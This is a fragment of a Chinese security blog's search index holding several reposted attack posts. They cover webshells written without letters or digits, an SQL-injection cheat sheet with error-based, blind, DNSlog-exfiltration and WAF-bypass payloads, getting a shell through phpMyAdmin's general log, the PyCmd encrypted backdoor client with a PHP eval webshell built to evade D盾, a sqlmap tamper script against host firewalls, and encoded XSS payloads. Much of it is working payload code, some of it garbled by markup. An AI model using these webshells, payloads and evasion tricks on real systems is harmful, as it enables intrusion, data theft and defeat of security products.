为什么要中继？因为sqlmap等软件无法发送chunked数据包(使用tamper也不行)","link":"/2019/SQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF/"},{"title":"[转]一些不包含数字和字母的webshell","text":"作者：离别歌正文：在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) { eval($_GET['shell']);}那么，这个代码如何利用？ 思路首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。 那么，变换方法 将是解决本题的要点。 不过在此之前，我需要说说php5和7的差异。 php5中assert是一个函数，我们可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。 方法一这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：12345&lt;?php$=('%01'^''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%13'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'').('%13'^''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%05'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'').('%12'^''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%14'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''); // $='assert';$='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $='POST';$__=$$;$($[_]); // assert($POST[]);执行结果如下： 方法二和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。 方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是&quot;\\x8c&quot;，其取反即为字母s： 利用这个特性，我找了一篇文章（ https://www.leavesongs.com/THINK/answer.html ），自动选择了其中一些汉字，生成如下答案：12345678910111213&lt;?php$=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$/$__;$_='';$=&quot;瞰&quot;;$_.=~(${$});$__=&quot;和&quot;;$_.=~(${$});$_=&quot;和&quot;;$_.=~(${$});$_=&quot;的&quot;;$_.=~(${$});$__=&quot;半&quot;;$_.=~(${$});$__=&quot;始&quot;;$_.=~(${$__});$_='';$__=&quot;俯&quot;;$_.=~($_{$});$=&quot;瞰&quot;;$__.=~($_{$});$=&quot;次&quot;;$__.=~(${$});$_=&quot;站&quot;;$_.=~($__{$});$=$$__;$_($[$]); 这个答案还利用了PHP的弱类型特性。因为要获取'和'{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2。 方法三那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。 这就得借助PHP的一个小技巧，先看文档： http://php.net/manual/zh/language.operators.increment.php 也就是说，'a'++ =&gt; 'b'，'b'++ =&gt; 'c'… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。 那么，如何拿到一个值为字符串’a’的变量呢？ 巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 再取这个字符串的第一个字母，就可以获得’A’了。 利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）：123456789101112131415161718192021222324252627282930313233343536&lt;?php$=[];$=@&quot;$&quot;; // $='Array';$=$['!'=='@']; // $=$[0];$=$; // A$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$__.=$; // S$_.=$; // S$=$;$++;$++;$++;$++; // E $__.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // R$.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T$.=$__;$_='';$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // P$__.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // O$__.=$;$=$_;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // S$__.=$;$=$_;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T$__.=$__;$=$$__;$($[]); // ASSERT($POST[]);执行结果： 原文链接：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html","link":"/2017/%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"},{"title":"SQL注入备忘录","text":"备忘录(一)拿起小本本记下常考知识点。 常用连接词 and &amp;&amp; %23%23 且 or || %7c%7c 或 xor 非 Access 数据库：只能爆破表名、列名获取数据、无法用盲注等数据主要存储在mdb、sap文件内 0x01 手工：先判断字段数：order by xx在使用联合查询猜测表名列名： 前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL 猜表：union select 1,2,3,xx猜列：union select 1,2,password,4,5 (如果页面返回正常，则存在password列，猜表同理)此方法兼容性不强。 0x02 工具：逐字猜解法：一、查表：and exists (select * from 表名)//这里的表名需要靠猜解，如果表名存在返回正常页面。二、查列：将*换成列名可进行爆破列名，即：and exists (select 列名 from 表名)三、确定列名下的数据长度：and (select top 1 len(列名) from 表名)=5 //判断数据长度是否为5，若为5则返回正常四、逐字猜解数据：and (select top 1 asc(mid(列名,位数,1)) from 表名)=97 //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常 mysql数据库：Version&lt;5.0: 爆破 盲注 version&gt;=5.0:information_schema表下存储了Mysql数据库所有的数据库结果信息。 information_schema.schemeta //Mysql里所有的数据库库名 information_schema.tables //所有表名 information_schema.columns //所有列名 常用函数： user() //查询数据库用户 version() //查询版本 @@basedir() //查询数据库路径 database() //查询当前数据库名 @@version_compile_os() //查询操作系统 用法例子：union select user(),2,3,version(),database(),xxx可用null代替：union select user(),null,null,version(),database(),xxx 更多函数： concat() //字符串相加 group_concat() //分组打印 length() //取字符串长度 substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名 mid(str,pos,len) //str字符串从pos位置开始取len个长度 ascii(str) //返回字符串str的首个字符的ASCII代码值 ord(str) //str或bool转为ascii if(a,b,c) //a为条件，若a正确则返回b，相反返回c. 常用查询：查询全部数据库名：select schema_name from information_schema.schemeta limit 0,10 //取前十个查询指定表名：select table_name from information_schema.tables where table_schema='sqli' //若单引号被过滤可用十六进制查询指定列名：select column_name from information_schema.columns where table_name='user' and table_schema='sqli'获取指定数据:select username,password from sqli.user (垮库查询) 注释： #，– X(X为任意字符)/(MySQL-5.1);%00'or 1=1;%00 'or 1=1 union select 1,2‘‘or 1=1 #‘/!50000or/ 1=1 – - //版本号为5.1.38时只要小于50138‘/!or*/ 1=1 – - nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略 宽字节注入：一、常见：mysql数据库编码为gbk,且若’被转义成\\’使用id=%df%27，这里的%27会被变成\\%27即%5c%27，再加上前边的%df变成%df%5c%27，而%df%5c在gbk字符集中表示汉子： 運，故语句便成id=運'，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)二、php函数utf8转gbk产生：https://xz.aliyun.com/t/1719 报错注入：floor()和rand()虚拟表报错原理：payload:union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by ahttps://www.2cto.com/article/201604/498394.html extractvalue()原理：extractvalue函数的第二个参数格式错误，会返回参数内容payload:and (extractvalue(1,concat(0x7e,(select user()),0x7e))) updatexml() 同上具有32位长度限制原理同上payload:and (updatexml(1,concat(0x7e,(select user()),0x7e),1))// concat 在前后加上 ~ 使数据不符合参数格式从而报错 GeometryCollection()等三重子查询报错 id = 1 AND GeometryCollection((select from (select from(select user())a)b))polygon()id =1 AND polygon((select from(select from(select user())a)b))multipoint()id = 1 AND multipoint((select from(select from(select user())a)b))multilinestring()id = 1 AND multilinestring((select from(select from(select user())a)b))linestring()id = 1 AND LINESTRING((select from(select from(select user())a)b))multipolygon()id =1 AND multipolygon((select from(select from(select user())a)b)) exp() Mysql5.5.5+原理：exp函数参数过大，转换时溢出报错payload:and exp(~(select * from(select user())a))https://drops.secquan.org/tips/8166 以上类型均为子查询注入Mysql盲注：类型 布尔盲注 时间盲注 布尔盲注：and ascii(substr(select user(),1,1))&gt;64 如果user()第一位字母Ascii大于64则页面返回正常时间盲注：and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1) 如果user()第一位字母Ascii大于64则页面延迟两秒返回 BENCHMARK(count,expr)此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注 常见注入： 数字型 字符串型按照注入类型：+SELECT型 //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。+INSERT型 //建立新的数据+UPDATA型 //修改数据+DELECT型 //删除数据 MYSQL长度限制绕过MYSQL对于用户输入的超长字符只会warning 而不是error真实案例： WP注册admin(55个空格)x用户 修改管理员密码 DNSlog注入select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\');https://www.cnblogs.com/afanti/p/8047530.htmlhttps://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html SQL注入防御：1.预编译sql2.限制输入数据类型3.过滤编码4.白名单5.管理数据库用户权限6.按时维护，打好补丁 SQL注入绕过：注入中常注意的编码： %01-%0D特殊字符绕空格 &amp;= 在浏览器Url时要进行URL编码 %26 %3d 查询字符串中不允许有空格，可用%20,+对其编码 Cookie注入时，SQL语句中的分号得编码 单引号过滤若有单引号保护，且无编码二次注入即无漏洞。若无单引号保护：字符串可用十六进制表示：0x123456，也可用concat(char(65)+char(75)+xxx) 注：中间层会将这些编码转换成未编码值 逗号过滤if()可改写为 case when () then () else () endsubstr()、mid()等可改写成substr((select user())from(1)for(1)) 等号过滤可用regexp、like、rlike、in等代替 判断注入点时的绕过： &amp;&amp; 1=1 &amp;&amp; 1=true &amp;&amp; false %23%23 true %23%23 ‘0’=0 %23%23 ‘a’=’b’=’c’ //true and~!!~if(‘a’=’b’=”c”,sleep(2),1) a’&lt;2 返回正常 &lt;0 返回空值 特定字符串被过滤时可用考虑全角字符 绕过WAF a) 大小写混合b)替换关键字c)使用编码d)使用注释e)等价函数与命令f)使用特殊符号g)HTTP参数控制h)缓冲区溢出i)整合绕过 与系统直接交互： load_file()读取文件into out_file() 写文件条件：FILE权限，管理员权限默认具有INTO OUTFILE 与 INTO DOMPFILE的区别后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。MYSQL UDF命令执行：sqlmap: --os-cmd id -v 1MSSQL：xp_cmdshell 其他：Boolean注入如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：and length(database())&gt;10 如果次条件为真切前条件返回真，则页面返回正常。 Cookie注入注入存在于Cookie中 XFF头注入注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。 堆叠注入PHP+Mysql不支持 连接符差异：Oracle: || 是连接符MSSQL: +MYSQL: [空格] 相关好文：SQL注入备忘手册(更新2017-12-11)巧用DNSlog实现无回显注入MySQL注入技巧Mysql报错注入原理分析(count()、rand()、group%20by)深入了解SQL注入绕过waf和过滤机制","link":"/2019/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"[转]phpmyadmin日志拿shell","text":"作者：珍惜少年时前提：条件是root用户。思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！ 要先把general log设置为ON 然后将文件修改日志文件名修改。 本来是在mysql下的一个log日志文件的，我重新改到了phpstudy目录下然后命名为def2.php 然后随便执行一条sql语句。 菜刀连接之。 原文链接：https://www.cnblogs.com/xishaonian/p/6622818.html","link":"/2017/%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell/"},{"title":"[转]利用PyCmd加密隐形木马，成功绕过D盾","text":"作者：nmask 之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神caomei相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。 PyCmd适用环境当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。 PyCmd使用我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。 为了方便，我已经把服务端木马程序放到了服务器网站目录下： php网站木马地址：10.0.3.13/test/p.php jsp网站木马地址：192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp 查看shell的情况： 此时，运行PyCmd.py程序：1python PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy]或者1python PyCmd.py -u http://192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp -p test [--proxy] 程序会自动判断输入的网站类型，这里是jsp类型的网站。 运行程序可输入以下参数： -h 查看帮助信息 -u 网站木马地址 -p 木马shell密码 –proxy 开启本地代理（方便调试）注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。 PyCmd数据加密PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。 当执行cmd命令时，通过Fiddler抓包查看数据： 查看回报信息： PyCmd木马隐身用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀（2016.9.18日检测结果） 这里演示php木马查杀： &lt;?php $string=”; $password=’test’; if(isset($_POST[$password])){ $hex=$_POST[$password]; for($i=0;$i&lt;strlen($hex)-1;$i+=2){ $string.=chr(hexdec($hex[$i].$hex[$i+1])); } @eval($string); }else{ echo “This is a Test!”; } ?&gt; 工具下载PyCmd 下载地址 项目地址：https://github.com/tengzhangchao/PyCmd 说明：绕过防火墙检测的方法很多，这里只是提供了一种思路，pycmd是我去年写的一款工具，最近打算完善其功能，代码已经开源。 原文连接：https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/","link":"/2017/%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE/"},{"title":"[转]绕过360,安全狗,D盾等进行Sql注入","text":"作者:Bypass0x01 前言在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。 0x02 环境搭建Windows Server 2003+phpStudy sql注入点测试代码：sql.php12345678910111213141516171819&lt;?php$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);if (!$con) { die('Could not connect: ' . mysql_error()); }mysql_select_db(&quot;test&quot;, $con);$id = $_REQUEST[ 'id' ];$query = &quot;SELECT * FROM admin WHERE username = $id &quot;;$result = mysql_query($query);while($row = mysql_fetch_array($result)) { echo $row['0'] . &quot; &quot; . $row['1']; echo &quot;&lt;br /&gt;&quot;; }echo &quot;&lt;br/&gt;&quot;;echo $query;mysql_close($con);?&gt;运行效果： 0x03 Bypass 过程对不同waf做了一些尝试，关于SQL注入bypass，可以考虑划分为3种： 1、完全bypass（union select+select from） 2、部分bypass（union select 或select from） 3、获取一些敏感信息（如version()、database()等） A、Union+select 先考虑如何绕过union+select，可以考虑一下几种形式 1、最常见形式 %20、+、/**/ 2、Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0 3、内联注释 /!12345select/ 通过组合测试，可以发现 union%0a/!12345select/ 1,2 可以绕过防御。 B、select+from select+from 也可以通过同样的组合形式绕过防御。 至此已完全绕过union+select+from。 0x04 自动化注入编写tamper bypass脚本，来利用sqlmap来跑数据 先看一下原始sqlmap的效果：1sqlmap.py -u http://192.168.106.130/config/sql.php?id=1 --flush-session --dbs 失败 加载tamper脚本，可成功获取数据。1sqlmap.py -u http://192.168.106.130/config/sql.php?id=1 --flush-session --technique=U --tamper=&quot;360safe.py&quot; --dbs tamper脚本：12345678910111213141516171819202122232425262728#!/usr/bin/env python&quot;&quot;&quot;write by Aaron&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): &quot;&quot;&quot; Replaces keywords &gt;&gt;&gt; tamper('UNION SELECT id FROM users') 'union%0a/*!12345select*/id%0a/*!12345from*/users' &quot;&quot;&quot; if payload: payload=payload.replace(&quot; ALL SELECT &quot;,&quot;%0a/*!12345select*/&quot;) payload=payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a/*!12345select*/&quot;) payload=payload.replace(&quot; FROM &quot;,&quot;%0a/*!12345from*/&quot;) payload=payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;) payload=payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;) payload=payload.replace(&quot;CAST(&quot;,&quot;/*!12345CASt(*/&quot;) payload=payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;) return payload&lt;/pre&gt;&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;这边主要是针对union select查询进行的关键字替换，测试过程中，可以发现利用tamper脚本来bypass的弊端，sqlmap的部分payload是固定的，部分关键字会被waf拦截，需要一步步调试，总结，测试哪些关键字是被拦截的，如何绕过关键字的检测等，还是挺麻烦。 0x05 END最好的自动化注入工具：可以考虑自己编写一个自动化注入工具，灵活的自定义payload来获取数据库信息。 目前的测试成果，可成功bypass注入防御，如 安全狗、云锁、360主机卫士、D盾_IIS防火墙等主机防护软件及各种云waf，有些姿势都在用。 原文链接：https://www.cnblogs.com/xiaozi/p/7275134.html","link":"/2017/%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360,%E5%AE%89%E5%85%A8%E7%8B%97,D%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5/"},{"title":"以浏览器解析机制来理解XSS载荷的编码转换","text":"0x00 前言之前在学习XSS的时候总感觉不是很系统，许多技巧背后原理都没有理解，光是会用罢了，如部分绕过编码技巧。今天打算花时间来补补基础。 0x00 基础知识HTML基础常见的字符实体 部分具有特定名称的字符实体而对于其他没有特定名称的实体来说： 十进制：对应符号的Ascii的值前加上&amp;#，后以;结尾 十六进制：对应符号的Ascii的值换算成16进制前加上&amp;#x，后以;结尾 注意：字符实体解码后得到的值为字符串型，HTML解析器只将其当做字符串文本处理。 HTML元素共有5种元素：空元素、原始文本元素、RCDATA元素、外来元素以及常规元素。 空元素：area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr 原始文本元素：script、style RCDATA元素：textarea、title 外来元素：来自MathML命名空间和SVG命名空间的元素。 常规元素：其他HTML允许的元素都称为常规元素。 原始文本、RCDATA以及常规元素都有一个开始标签来表示开始，一个结束标签来表示结束。某些元素的开始和结束标签是可以省略的，如果规定标签不能被省略，那么就绝对不能省略它。空元素只有一个开始标签，且不能为空元素设置结束标签。外来元素可以有一个开始标签和配对的结束标签，或者只有一个自闭合的开始标签，且后者情况下该元素不能有结束标签。 元素内容限制空元素不能有任何内容（因为空元素没有结束标签，自然没办法在开始标签和结束标签之间放内容）。原始文本元素只可以包含文本RCDATA元素可以包含文本和字符引用，但是文本中不能包含意义不明的符号。对于外来元素，当开始标签自闭合时，不能包含任何内容（因为没有结束标签，所以不能在开始标签和结束标签之间放内容）。当开始标签不自闭合时，其内容可以包含文本、字符引用、CDATA块、其他元素和注释，但是文本不能包含编码为U+003C的小于符号（&lt;）或者意义不明的符号。 浏览器显示页面流程：先逐行加载页面，并将引用的外部文件下载下来-&gt;接着逐行解析页面，解析一部分后会将已解析的部分进行渲染，实现边解析边渲染。 浏览器解析机制 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号）就会进入”标签开始状态(Tag open state)”。然后转变到”标签名状态(Tag name state)”，”前属性名状态(before attribute name state)”……最后进入”数据状态(Data state)” 并释放当前标签的token。当解析器处于”数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 引自：深入理解浏览器解析机制和XSS向量编码 1.标签a解析例子&lt;a href=&quot;http://www.0x002.com&quot;&gt;0x002&lt;/a&gt; 1）起始标签a范围：&lt;a href=&quot;http://www.0x002.com&quot;&gt; DataState：碰到&lt;,进入TagOpenState状态 TagOpenState：碰到a,进入TagNameState状态（HTMLToken的type为StartTag） TagNameState：碰到空格，进入BeforeAttributeNameState状态（HTMLToken的m_data为a） BeforeAttributeNameState：碰到h,进入AttributeNameState状态 AttributeNameState：碰到=，进入BeforeAttributeValueState状态（HTMLToken属性列表中加入一个属性，属性名为href) BeforeAttributeValueState: 碰到&quot;，进入AttributeValueDoubleQuotedState状态 AttributeValueDoubleQuotedState：碰到b，保持状态，提取属性值 AttributeValueDoubleQuotedState：碰到&quot;，进入AfterAttributeValueQuotedState(HTMLToken当前属性的值为http://www.0x002.com). AfterAttributeValueQuotedState: 碰到&gt;，进入DataState，完成解析。 在完成startTag的解析的时候，会在解析器中存储与之匹配的end标签（m_appropriateEndTagName），等到解析end标签的时候，会同它进行匹配（语法解析的时候）。 html，body起始标签类似a起始标签，但没有属性解析 2)a元素内容DataState：0x002，碰到0,维持原状态，提取元素内容(HTMLToken的type为character)。 DataState：0x002，碰到&lt;,完成解析，不consume’&lt;’。(HTMLToken的m_data为w3c)。 3）a结束标签DataState：0x002，碰到&lt;,进入TagOpenState。 TagOpenState：0x002，碰到/,进入到EndTagOpenState。（HTMLToken的type为endTag）。 EndTagOpenState：0x002，碰到a,进入到TagNameState。 TagNameState：0x002，碰到&gt;,进入到DataState，完成解析。 这部分设计到状态机的知识，与解析原理有关。 为什么要讲这部分呢？因为他与接下来要讲的XSS载荷字符实体编码有关。 HTML解析器，部分标签在完成解析时，会按照节点类型、节点属性等生成不同的解析器去完成接下来的工作。 如a标签的href属性，HTML解析器会生成一个Url解析器去解析里边的内容。 对于&lt;script&gt;，HTML解析器生成JS解析器去执行标签内容，执行时HTML解析器阻塞、渲染阻塞，等待执行完毕后恢复。 0x02 各种编码讲解1.字符实体编码解码操作在HTML解析器中。 有三种情况可以容纳字符实体，”数据状态中的字符引用”，”RCDATA状态中的字符引用”和”属性值状态中的字符引用”。在这些状态中HTML字符实体将会从&amp;#...形式解码，对应的解码字符会被放入数据缓冲区中。例如，在问题4中，”&lt;”和”&gt;”字符被编码为&amp;#60;和&amp;#62;。当解析器解析完&lt;div&gt;并处于”数据状态”时，这两个字符将会被解析。当解析器遇到&amp;字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用（例如”<”）并释放出对应字符的token。在这个例子中，对应字符指的是&lt;和&gt;。读者可能会想：这是不是意味着&lt;和&gt;的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到”标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成”数据”。 简单的说，字符实体编码仅在下列几种情况适用： 标签内容(不包括原始文本元素，如&lt;script&gt;): &lt;&gt;[在这]&lt;/&gt; RCDATA元素内容中(&lt;textarea&gt;、&lt;title&gt;)：&lt;&gt;[在这]&lt;/&gt; 标签属性值内容：&lt;xx xx=&quot;[在这]&quot;&gt;(&lt;/xx&gt;) 2.URL编码解码操作在URL解析器中 例子： 对于&lt;a href=&quot;javascript:alert%281%29&quot;&gt;&lt;/a&gt;来说：HTML解析后，把javascript:alert(1)发送给URL解析器，此时URL解析器会先寻找:冒号，以确定该内容的协议。如未找到或无法确定，则默认为http协议，本例中为javascript协议。Url解析器会将协议冒号后边(若无冒号或无法确定协议，则解码的群体为全部内容)的字符全部进行一次url解码，即对alert%281%29进行URL解码，得到alert(1)。 3.Unicode编码解码操作在Javascript解析器中 JS解析器支持对标识符进行Unicode编码。什么是标识符？简单的说，标识符包括了函数名、字符串常量。主要看编码的字符是构成哪个部分的字符，如: 123&lt;script&gt;Alert('xss');&lt;/script&gt; 对于该例来说，alert(属于函数名部分，是标识符)可进行部分或全部的Unicode编码，xss(属于字符串常量，是标识符)也可进行全部/部分Unicode编码。换句话说，经Unicode解码后的内容只能构成函数名和字符串。 0x03 常见添加编码的XSS载荷讲解12345678910111213141516171819202122232425262728291. &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;2. &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;3. &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;4. &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;5. &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;6. &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;7. &lt;button onclick=&quot;confirm('7');&quot;&gt;Button&lt;/button&gt;8. &lt;button onclick=&quot;confirm('8\\u0027);&quot;&gt;Button&lt;/button&gt;9. &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;10. &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;11. &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;12. &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;13. &lt;script&gt;alert('13\\u0027)&lt;/script&gt;14. &lt;script&gt;alert('14\\u000a')&lt;/script&gt;15. &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;